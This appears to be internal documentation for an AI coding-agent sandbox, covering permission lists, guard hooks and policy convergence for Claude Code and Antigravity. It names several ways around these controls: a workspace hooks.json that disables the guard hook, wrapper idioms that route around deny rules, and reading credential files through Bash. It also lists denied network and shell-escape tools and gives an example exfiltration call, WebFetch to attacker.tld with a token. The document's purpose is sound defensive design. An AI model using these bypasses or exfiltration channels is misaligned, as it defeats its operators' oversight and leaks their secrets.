# Permissions posture and exfil channels

The deny/allow model in `sandbox_templates/claude/claude-settings.json`, the two-phase planning/autonomous workflow, and the channels (WebFetch, Read tool denies, deny-destructive hook) that need explicit operator awareness.

The hook ruleset itself lives in `docs/deny-destructive-hook-plan.md`. This page is the surrounding model.

## Two agents, the same posture, one asymmetry

Since 2026-08-22 ([ADR-0006](adr/0006-antigravity-is-two-layer-like-claude.md))
Antigravity (`agy`) carries the same two layers as Claude Code, expressed in its
own grammar. The lists are diffed against each other by
`scripts/agent-policy.test.sh`, so they deny the same set by construction.

| | Claude Code | Antigravity (`agy`) |
|---|---|---|
| Static policy | `permissions.allow/ask/deny` in `/root/.claude/settings.json` | `permissions.allow/ask/deny` in `/root/.gemini/antigravity-cli/settings.json` |
| Grant syntax | `Bash(npm install:*)` | `command(npm install)` — also prefix-matched |
| Hook | `PreToolUse` in `settings.json` | `PreToolUse` in `/root/.gemini/config/hooks.json` |
| Hook engine | `deny-destructive.sh` | the **same script**, `--dialect=antigravity` |
| Secret-file reads | `Read(**/.env)` etc. in the static list | the hook, across `view_file`/`grep_search`/`run_command` |
| Hook failure | fail-**open** | fail-**closed** |

**Which layer is load-bearing differs between the two agents, and this is the
part worth internalising.** For Claude the static list is primary and the hook
is defence-in-depth on top of it. For `agy` that is also true, but for a sharper
reason: `agy` discovers workspace customizations under `.agents/`, `.agent/`,
`_agents/` and `_agent/`, merges hooks **by name**, and lets the workspace copy
outrank the global one — so a file containing
`{"sandbox-guardrails": {"enabled": false}}` in any attached workspace switches
the hook off. Measured, not theorised (`work/0010` Phase 0). Nothing in a
workspace can reach `settings.json`, which is why every hard denial lives there.

The hook blocks writes to a workspace `hooks.json` (both the write-tool and the
shell route), tier-1 verify scans for one, and `scripts/audit/probes/antigravity.py`
reports DRIFT if one exists. Those are the compensations; the static list is the
control.

Two residual gaps, both recorded in ADR-0006 rather than papered over:

- **`agy`'s `ask` is stickier than Claude's.** An `ask` approval is cached as an
  Always-Allow grant, so the mutating `myclickup` set prompts once under `agy`
  and every time under Claude. The hook can emit `force_ask`, which ignores the
  cache; wiring it is follow-up.
- **Secret reads are hook-only under `agy`.** The file-grant syntax for its
  static list was not reverse engineered, so reads are enforced at the layer a
  workspace file can disable. Commands are not affected.

## What a repo-local file can and cannot do

**A repo-local settings file can TIGHTEN this posture. It can never loosen it.**
Reach for `.claude/settings.local.json` to unblock `curl` and you will spend an
afternoon before finding that out, so it is written here first.

Claude Code evaluates `deny`, then `ask`, then `allow`; the first match in that
order decides, and specificity does not reorder it. The same holds ACROSS
scopes: `permissions` lists are unioned from every settings file and evaluated
deny-first, so a user-level deny blocks a project-level allow just as a
project-level deny blocks a user-level allow. In this sandbox the global
template is the user-level file, which makes it a one-way ratchet.

| In a repo's `.claude/settings.local.json` you can | |
|---|---|
| add a **deny** (tighten) | yes |
| add an **allow** for something not globally denied — the project's own build/test commands | yes |
| set a preference: `model`, `effortLevel`, `theme`, `statusLine`, `agentPushNotifEnabled` | yes |
| **re-allow something the sandbox globally denies** | **no — structurally impossible** |
| **promote an `ask` to `allow`** | **no** — a matching `ask` prompts even when a more specific `allow` also matches |

Two operational caveats. Project-scope **`allow`** rules apply only after the
folder is trusted; `deny` and `ask` apply immediately. And
`skipAutoPermissionPrompt` is **user-or-managed scope only** — it cannot go in a
repo file at all, which is why the convergence carries it on its preserve list
instead of dropping it. Since 2026-08-24 that list is four keys:
`skipAutoPermissionPrompt`, `model`, `effortLevel`, `agentPushNotifEnabled`. The
latter three *could* go in a repo file, per the table above; they are preserved
anyway because re-picking a model and an effort level after every `up` is
friction the sandbox gains nothing from.

Widening is therefore a global act, by design: edit the template (and take the
`SECURITY IMPACT` line that comes with it), or widen egress for one command
through `scripts/with-egress.sh` — which is [ADR-0003](adr/0003-strict-egress-default.md)'s
position anyway.

### The same question, per agent

| | Per-repo override surface | Evaluation |
|---|---|---|
| **Claude Code** | `.claude/settings.local.json` — tighten-only, as above | deny → ask → allow, unioned across scopes |
| **Antigravity (`agy`)** | **none exists** | deny-first (measured, work/0010) |
| **opencode** (not wired yet) | a repo-root `opencode.json` that **overrides** the global config | last-match-wins globs |

`agy`'s workspace customization root (`.agents/`, `.agent/`, `_agents/`,
`_agent/`) carries exactly five things — skills, rules, plugins,
`mcp_config.json`, `hooks.json` — and no permissions file is among them.
Project-scoped settings do carry permission grants, but they live host-side in
`gemini-home/config/projects/<uuid>.json` keyed by `folderUri`, outside the repo,
and are written by the app's own sync; two plausible on-disk shapes were tried
against a live `agy` and both produced `no grants for project`. So the nearest
in-repo lever `agy` has is `.agents/hooks.json` — **the bypass ADR-0006 exists to
block**. The tighten-only pattern is Claude-only, and inventing a cross-agent
override file to paper over that would be inventing a file no agent reads.

opencode inverts the ratchet, which is why it is NOT wired to the global config:
a repo file overrides it, and the agent can write a repo file. Its policy will
have to land in the managed config, at a path a per-profile bind mount can reach.

## Policy convergence: the live file is the template

Since 2026-08-24 ([ADR-0007](adr/0007-policy-templates-are-source-of-truth-for-every-agent.md))
every agent's policy is reconciled to its template on every
`up`/`recreate`/`rebuild`/`wipe`, and by `scripts/profile.sh <p> converge` on
demand. Before that, Claude's `settings.json` was seeded **create-only** — the
repo's most security-relevant file was the one thing that silently lagged its
template, and it did, for five days across all three profiles.

Claude's file is **overwritten** from the template; `agy`'s is **merged** on the
two keys the sandbox owns. The asymmetry is the rule "overwrite where the agent
has somewhere else to put its preferences, merge where it does not" — see the
per-agent table above for why `agy` has nowhere.

The consequence worth internalising: **"Yes, and don't ask again" is not
permanent.** An in-session grant lands an `allow` rule in `permissions`, a
sandbox-owned key, and the next converge reverts it — after capturing it to
`claude-home/settings.discarded.json` and warning once. Making a grant permanent
means editing the template, which is exactly what happened to the three
`myclickup` writes below. That is the intended posture, not an accident of the
implementation.

### Preferences are preserved, not overwritten

Four keys are exempt from the overwrite — `skipAutoPermissionPrompt`, `model`,
`effortLevel`, `agentPushNotifEnabled` — and preserve means two things:

- a value already in your live `settings.json` **survives** every converge;
- if the live file **lacks** the key (a brand-new profile), the **template
  default** seeds it: `model: opus`, `effortLevel: medium`,
  `agentPushNotifEnabled: false`.

Because they are preserved rather than owned, neither drift detector compares
them: tier-1 `verify` checks the owned keys only (`env`, `hooks`, `permissions`,
`sandbox`), and tier-2's `template_diff` strips the preference keys from both
sides. A live `model` that differs from the template default is the design
working, not drift.

To force a profile back onto the template defaults:

```bash
scripts/profile.sh <profile> converge --defaults    # just converge <p> --defaults
```

That overwrites all four preserved keys and records what it replaced under
`preference_resets` in `claude-home/settings.discarded.json`, so the reset is
recoverable like every other loss this convergence causes.
`skipAutoPermissionPrompt` has no template default, so `--defaults` leaves it
alone rather than dropping a key no repo file can hold.

## Two-phase workflow

- **Planning runs** (you driving, approving each step): uncomment the planning-mode section in `proxy/allowed_domains.txt` (pypi/npm/git), restart Squid, do clones/installs/pushes yourself. `permissions.defaultMode: "auto"` means Bash is prompt-gated for commands not on the allow list.
- **Autonomous runs** (agent driving): re-comment the planning-mode domains, restart Squid. The agent's allow list covers routine read-only / non-destructive Bash; deny list blocks network tools (`curl`, `wget`, `ssh`, `scp`, `rsync`, `git push/clone/fetch`, `gh`, `glab`), package installers (`pip`, `npm`/`npx`, `pnpm`, `yarn`, `bun`, `uv` incl. `uv sync`/`uv lock`, `poetry`, `pipx`, `cargo`, `go install`), shell-escape patterns (`bash -c`, `python -c`, `node -e`, `uv run bash`, `perl`, `ruby`, `lua`, `env`, `xargs`, `eval`), and `awk` (gawk's `system()`), `sed` (gnu sed's `e` command), `ssh-keygen`, `git submodule` (fetches via configured URL, bypasses the `git fetch` deny), and `git config` (could rewrite `credential.helper` to a host-reaching shim between scrub passes).

`WebSearch` stays on; **`WebFetch` is intentionally OFF the default allow list** — see below.

## Deny list is defense in depth, not the boundary

Claude Code's permission matcher keys on the command prefix; denies can be routed around by wrapper idioms hard to enumerate exhaustively (`find -exec`, `make`, `npm run`, `<interpreter> /tmp/script.<ext>`). When the deny list misses, the real boundary still holds: egress proxy (domain + port allowlist), seccomp (no user namespaces), rootless Docker userns (container root = host UID 1000) + `cap_drop: ALL`.

The deny-destructive `PreToolUse` hook extends coverage to destructive primitives reachable through allowed prefixes (`find -delete`/`-exec`/`-execdir`/`-ok`, `git clean -fdx`, `shred`, `truncate`, `dd of=`, `mkfs`) and to writes targeting the hook/settings files themselves. The prefix matcher in `permissions.deny` remains the primary filter; the hook is the content-aware secondary layer for what the prefix matcher structurally can't see. See `docs/deny-destructive-hook-plan.md` for ruleset and maintenance.

## The discipline

If the agent says it needs a new package or fresh clone, that's a planning-phase signal — exit autonomous mode, you do it, resume. Don't widen agent permissions for one-off installs.

For one-shot planning-mode installs, `scripts/with-egress.sh` automates the toggle/restart/exec/restore loop:

```bash
scripts/with-egress.sh <p> -- '<cmd>'
scripts/with-egress.sh <p> --with pypi,npm -- '<cmd>'
```

## Reviewed allow-list decision: `myclickup` reads yes, most writes prompt

The image bakes `myclickup`, a CLI over the ClickUp REST API. **Surface as of
0.6.0: 28 commands, 17 read and 11 write** — derived from the CLI's own parser
on 2026-08-15, never transcribed. The paragraph that stood here until 2026-08-24
said "19 commands: 13 reads and 6 writes … so every write hits the
`defaultMode: auto` prompt", and it was stale twice over: the count had been
copied across a repo boundary in prose and was nine commands out of date, and
the mechanism was wrong. **Absence from `allow` does not produce a prompt.**
Under `defaultMode: auto` an unlisted command is handed to a classifier — proven
2026-08-15 in a live container, where `myclickup create --help` ran unprompted
and was reported as `Allowed by auto mode classifier`. What produces a prompt is
being named in `permissions.ask`, which is why the writes are listed there as an
explicit rule rather than left to a gap. Derive the count from the tool; state
the mechanism you tested.

The template allows the 17 reads plus **three writes promoted on 2026-08-24 by
explicit owner sign-off**: `comment`, `set-status`, `update` (work/0011 T00).
The other **eight** — `create`, `claim`, `tag`, `untag`, `depend`, `undepend`,
`move`, `append-description` — stay in `ask` and prompt every time.

The promotion is recorded in the template rather than in a repo-local file
because no repo-local file can express it: while a command is listed in `ask`,
no `.claude/settings.local.json` can promote it to `allow` (see the tighten-only
rule above). It began as an in-session "Yes, and don't ask again" in
`fluidmomenta`, which under convergence would have been reverted on the next
`up`. **Security impact: three ClickUp writes now run unprompted in every
profile** — a comment, a status change, a task-field update. All three are
additive or reversible against a shared workspace; none destroys an object, and
`delete`/`rm` remain in `deny`. The same three were promoted in the `agy`
template in the same commit — the offline suite diffs the two lists exactly, so
a one-sided promotion cannot ship.

The blanket `Bash(myclickup:*)` was rejected: it would cover all 28 including
the eight that still prompt and the two denied delete verbs, and `--dry-run`
being available does not make it a gate, because opting into it is the agent's
choice.

Two details make the split hold rather than merely look tidy:

- **No allowed entry is a prefix of a still-asked write.** Re-verified after
  the 2026-08-24 promotion: `Bash(myclickup status:*)` over-matches `statuses …`
  but not `set-status`, a different prefix that now carries its own allow entry;
  `Bash(myclickup comment:*)` over-matches `comments …`, and both are permitted
  either way; `Bash(myclickup task:*)` also matching `tasks …` is harmless, both
  are reads. None of the three promoted entries is a prefix of any of the eight
  that still prompt.
- **`Bash(myclickup --dry-run:*)` is what makes reads-only workable.** The
  permission prompt shows argv, not what argv resolves to: `--list
  "Team/Build/Action Items"` becomes a list ID and `--due 2026-09-01` becomes
  epoch-ms. A dry-run prints the resolved request, so the human approves
  something they have actually seen. The tool accepts the flag **before** the
  subcommand (its ADR-0007) specifically so a prefix pattern can match it —
  the trailing form is indistinguishable from a live write to a prefix matcher.
  Verified 2026-08-10 that a dry-run needs no token at all, so the inert form is
  inert even in a profile with no ClickUp credential.

`permissions.deny` also carries `Bash(myclickup delete:*)` and
`Bash(myclickup rm:*)` as **forward guards**. Neither command exists today (the
only HTTP `DELETE` in the tool is `untag`, which removes a tag, not an object).
They cost nothing and mean a future version that adds deletion arrives denied
rather than silently newly-permitted — the allow list is reviewed when it is
written, the CLI is upgraded by image rebuild, and those two events are months
apart.

The accepted residual is the one this page already names: `Bash(just:*)` and
`Bash(make:*)` are allowed, so a workspace recipe wrapping a write runs
unprompted. That is wrapper routing, not a myclickup-specific hole, and the
boundary that still holds is egress — `api.clickup.com` is reachable, but the
token is env-injected and never appears on argv or in the Squid URL log.

## `Read(**/.credentials*)` denies are nudges, not gates

The `Read` deny list in `sandbox_templates/claude/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons. The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.

## WebFetch is server-side egress that bypasses the proxy

`WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.

The template (`sandbox_templates/claude/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.example.com)`. **Do not add bare `WebFetch` back to the template's allow list.**
